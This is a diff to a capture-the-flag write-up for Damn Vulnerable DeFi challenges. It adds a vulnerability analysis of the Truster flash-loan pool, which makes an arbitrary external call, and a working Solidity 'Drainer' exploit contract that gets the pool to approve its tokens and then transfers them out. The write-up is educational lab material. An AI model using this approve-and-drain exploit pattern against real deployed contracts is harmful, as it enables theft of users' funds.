@@ -100,6 +100,7 @@ So, we need to drain 1010 WETH from the pool and borrower contract. In NaiveRece
 The onFlashLoan() function only checks if the caller is the pool, but it doesn't check if the transaction initiator is the actual owner of the contract. This means that anyone can call the transaction on the owner's behalf, and here is the solution to the first part of our challenge. As the fee of the loan is 1 ETH, we can drain the borrower's balance by simply calling the loan function 10 times on the owner's behalf. Now, all 1010 ETH are on the contract's balance and belong to the pool deployer.
 We also need to drain the pool's balance. If we look closer to withdraw function, we'll see that the function does not check if the receiver is the initiator of the withdrawal. 
 
+    function withdraw(uint256 amount, address payable receiver) external {
         // Reduce deposits
         deposits[_msgSender()] -= amount;
         totalDeposits -= amount;
@@ -189,4 +190,37 @@ To pass this challenge, rescue all funds in the pool executing a single transact
 
 ### Contracts
 
-TrusterLenderPool.sol - 
+TrusterLenderPool.sol
+
+### Vulnerability Analysis
+
+The pool's core functionality is implemented in flashLoan function. At the end of the function, it checks if the funds are fully refunded, so we need to find a way to get the DVT tokens after the function execution. 
+If we look closer, we can see that contract lets us make arbitrary function call.
+
+        target.functionCall(data);
+
+This means, that we can call any function we want from flashLoan function. So if we make the pool contract to approve the DVT tokens for us, later we can transfer them to our recovery address. 
+
+### Solution
+
+    contract Drainer {
+        constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
+            bytes memory data = abi.encodeWithSignature(
+                "approve(address,uint256)",
+                address(this),
+                token.balanceOf(address(pool))
+            );
+
+            pool.flashLoan(0, address(this), address(token), data);
+
+            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+        }
+    }
+
+    /**
+    * CODE YOUR SOLUTION HERE
+    */
+    function test_truster() public checkSolvedByPlayer {
+        Drainer drainer = new Drainer(token, pool, recovery);
+    }
+
